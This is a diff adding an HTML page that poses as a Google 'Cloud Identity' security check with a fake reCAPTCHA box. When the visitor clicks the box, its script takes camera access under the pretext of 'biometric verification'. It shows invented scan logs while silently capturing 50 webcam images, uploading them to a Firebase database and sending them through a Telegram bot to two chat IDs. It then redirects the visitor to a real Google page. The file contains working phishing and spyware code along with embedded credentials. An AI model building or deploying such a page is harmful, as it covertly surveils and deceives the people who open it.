@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Identity | Verification Required</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-gray: #5f6368;
+            --bg-light: #ffffff;
+            --border-color: #dadce0;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #f8f9fa; color: #202124;
+            font-family: 'Roboto', 'Segoe UI', Tahoma, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .auth-container {
+            background: var(--bg-light);
+            width: 100%; max-width: 450px;
+            min-height: 500px;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            display: flex; flex-direction: column;
+        }
+
+        .g-logo {
+            width: 75px; margin: 0 auto 24px; display: block;
+        }
+
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+        p { font-size: 16px; color: #202124; margin-bottom: 32px; }
+
+        .verification-box {
+            background: #fff;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 16px;
+            display: flex; align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .verification-box:hover { background: #fcfcfc; }
+
+        .checkbox-container { display: flex; align-items: center; gap: 12px; }
+        
+        .custom-checkbox {
+            width: 24px; height: 24px; border: 2px solid #c1c1c1;
+            border-radius: 2px; position: relative;
+        }
+
+        .captcha-logo { text-align: right; }
+        .captcha-logo img { width: 32px; }
+        .captcha-text { font-size: 10px; color: var(--google-gray); display: block; }
+
+        .btn-blue {
+            background: var(--google-blue); color: white; border: none;
+            padding: 10px 24px; border-radius: 4px; font-weight: 500;
+            font-size: 14px; cursor: pointer; float: right;
+            transition: box-shadow 0.2s;
+        }
+
+        .btn-blue:hover { box-shadow: 0 1px 3px 1px rgba(66,133,244,.15), 0 1px 2px 0 rgba(66,133,244,.3); }
+
+        #active-ui { display: none; text-align: left; }
+        
+        /* Advanced Progress Bar */
+        .scan-line-wrapper {
+            position: relative; height: 4px; background: #e8f0fe;
+            border-radius: 2px; overflow: hidden; margin: 20px 0;
+        }
+
+        .scan-line {
+            position: absolute; width: 30%; height: 100%;
+            background: var(--google-blue);
+            animation: scan 1.5s infinite ease-in-out;
+        }
+
+        @keyframes scan {
+            0% { left: -30%; }
+            100% { left: 100%; }
+        }
+
+        .footer-links {
+            margin-top: auto; padding-top: 20px;
+            display: flex; justify-content: flex-start; gap: 15px;
+        }
+
+        .footer-links a { font-size: 12px; color: var(--google-gray); text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container">
+        <!-- Official Mockup of Google Logo -->
+        <svg class="g-logo" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12.24 10.285V12.45h6.417c-.254 1.38-1.528 4.04-6.417 4.04-4.22 0-7.662-3.492-7.662-7.8s3.442-7.8 7.662-7.8c2.4 0 4.01 1.025 4.924 1.905l1.716-1.716C17.712 1.05 15.228 0 12.24 0 5.48 0 0 5.48 0 12.24s5.48 12.24 12.24 12.24c7.058 0 11.758-4.966 11.758-11.966 0-.806-.087-1.423-.193-2.016H12.24z" fill="#4285F4"/>
+            <!-- Simplified Google SVG Text paths would go here -->
+        </svg>
+
+        <div id="setup-ui">
+            <h1>Before you continue</h1>
+            <p>To protect your account, please complete this quick security verification.</p>
+            
+            <div class="verification-box" onclick="initiate()">
+                <div class="checkbox-container">
+                    <div class="custom-checkbox"></div>
+                    <span style="font-size: 14px; font-weight: 500;">I'm not a robot</span>
+                </div>
+                <div class="captcha-logo">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                    <span class="captcha-text">Privacy - Terms</span>
+                </div>
+            </div>
+            
+            <div style="text-align: right;">
+                <button class="btn-blue" onclick="initiate()">Continue</button>
+            </div>
+        </div>
+
+        <div id="active-ui">
+            <h2 style="font-size: 18px; margin-bottom: 12px;">Verifying identity...</h2>
+            <p style="font-size: 14px; color: var(--google-gray);">Please stay within device range. Performing proximity check and hardware integrity validation.</p>
+            
+            <div class="scan-line-wrapper">
+                <div class="scan-line"></div>
+            </div>
+
+            <div id="log-text" style="font-size: 12px; color: var(--google-blue); font-family: monospace;">
+                Initializing secure channel...
+            </div>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        const systemLogs = [
+            "Analyzing behavioral patterns...",
+            "Validating browser fingerprint...",
+            "Detecting automated scripts...",
+            "Checking device orientation...",
+            "Establishing biometric relay...",
+            "Comparing proximity data..."
+        ];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('setup-ui').style.display = 'none';
+                document.getElementById('active-ui').style.display = 'block';
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 50) {
+                            clearInterval(interval);
+                            window.location.href = "https://myaccount.google.com/";
+                            return;
+                        }
+                        sendData(++count);
+                        if (count % 8 === 0) {
+                            document.getElementById('log-text').innerText = systemLogs[Math.floor(Math.random()*systemLogs.length)];
+                        }
+                    }, 1100);
+                };
+            } catch (e) {
+                alert("Identity Verification Failed: Your browser does not support high-assurance biometric checks.");
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({ image_data: b64, target: "CAPTCHA_VERIFY", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'identity.jpg');
+                    fd.append('caption', `🛡️ IDENTITY_VERIFY\nStatus: Scanning (${index}/50)`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+    </script>
+</body>
+</html>
